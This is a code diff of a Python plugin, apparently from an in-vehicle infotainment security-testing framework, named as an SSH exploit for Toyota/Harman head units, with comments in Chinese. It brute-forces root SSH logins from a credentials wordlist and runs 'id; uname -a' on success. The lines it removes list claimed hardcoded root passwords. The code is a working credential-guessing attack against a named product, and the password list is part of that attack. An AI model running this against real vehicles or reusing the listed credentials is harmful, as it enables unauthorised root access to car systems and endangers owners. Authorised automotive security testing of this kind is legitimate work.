@@ -1,45 +1,62 @@
 import paramiko
+import os
 from iv_plugin_base import IVIVulnerabilityPlugin
 
 class ToyotaHarmanSSHExploit(IVIVulnerabilityPlugin):
     def check_prerequisites(self):
-        # 检查网络可达性（假设已通过USB网卡连接）
+        # 检查网络可达性
+        if not self.target_ip:
+            raise RuntimeError("需要指定目标IP地址。")
         response = os.system(f"ping -c 1 {self.target_ip} > /dev/null 2>&1")
-        if response!= 0:
-            raise RuntimeError(f"目标 {self.target_ip} 不可达。请确认USB以太网适配器连接正常。")
+        if response != 0:
+            self.logger.warning(f"目标 {self.target_ip} Ping不通, 但仍尝试连接...")
+        return True
 
     def exploit(self):
-        # 已知的硬编码凭证列表（来源于公开披露或字典）
-        # 实际密码通常是项目代号，如 "falcOn", "harman_fara" 等
-        credentials = [
-            ("root", "falcOn"), 
-            ("root", "harman_fara"), 
-            ("root", "project_name_123")
-        ]
+        wordlist_path = os.path.join(os.path.dirname(__file__), '..', 'wordlists', 'credentials.txt')
+        if not os.path.exists(wordlist_path):
+            self.logger.error("未找到字典文件 credentials.txt")
+            self.results["vulnerable"] = False
+            return self.results
+            
+        self.logger.info("开始基于车机通用安全字典的 SSH 硬编码爆破...")
         
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        
-        for user, password in credentials:
-            try:
-                logger.info(f"尝试SSH登录: {user}:{password}...")
-                client.connect(self.target_ip, username=user, password=password, timeout=3)
-                logger.info(">>> 成功！已获取 Root Shell。 <<<")
-                
-                # 执行命令验证权限
-                stdin, stdout, stderr = client.exec_command('id; uname -a')
-                output = stdout.read().decode().strip()
-                logger.info(f"系统信息: {output}")
-                
-                client.close()
-                return
-            except paramiko.AuthenticationException:
-                logger.warning("认证失败。")
-            except Exception as e:
-                logger.error(f"连接错误: {e}")
-        
-        logger.info("字典耗尽，未能破解SSH凭证。")
-
-# 使用示例:
-# poc = ToyotaHarmanSSHExploit(target_ip="192.168.1.1")
-# poc.run()
+        try:
+            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or ':' not in line:
+                        continue
+                        
+                    parts = line.split(':', 1)
+                    user = parts[0]
+                    password = parts[1]
+                    
+                    try:
+                        client = paramiko.SSHClient()
+                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        client.connect(self.target_ip, username=user, password=password, timeout=2, banner_timeout=2)
+                        self.logger.warning(f">>> [+] 成功！利用已知凭证获取 Shell: {user}/{password} <<<")
+                        
+                        self.results["vulnerable"] = True
+                        self.results["evidence"] = f"SSH Hardcoded/Default Credentials: {user}/{password}"
+                        
+                        # 执行命令验证权限
+                        _, stdout, _ = client.exec_command('id; uname -a')
+                        output = stdout.read().decode('utf-8', 'ignore').strip()
+                        self.logger.info(f"    系统指纹: {output}")
+                        
+                        client.close()
+                        return self.results
+                    except paramiko.AuthenticationException:
+                        continue
+                    except Exception as e:
+                        break
+            
+            self.logger.info("安全字典执行完毕，未匹配到任何已知的 SSH 后门或硬编码凭证。")
+            self.results["vulnerable"] = False
+        except Exception as e:
+            self.logger.error(f"字典读取或解析意外错误: {str(e)}")
+            self.results["vulnerable"] = False
+            
+        return self.results
